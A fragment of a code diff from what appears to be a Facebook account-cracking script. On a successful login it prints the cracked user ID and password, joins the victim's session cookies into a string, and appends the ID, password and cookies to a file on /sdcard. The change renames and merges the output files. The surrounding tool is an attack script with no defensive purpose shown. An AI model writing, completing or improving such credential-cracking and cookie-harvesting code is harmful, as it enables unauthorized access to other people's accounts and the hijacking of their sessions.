@@ -420,8 +420,7 @@ def _M2_(ids,pasx):
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
                                 coki = ";".join(i["name"]+"="+i["value"] for i in BLACK["session_cookies"])
                                 print("Cookie: "+coki)
-                                open('/sdcard/ATOM-COOKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
-                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
+                                open('/sdcard/ATOM-M2-COOKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 ok.append(uid)
                                 break
                         elif 'www.facebook.com' in str(BLACK):
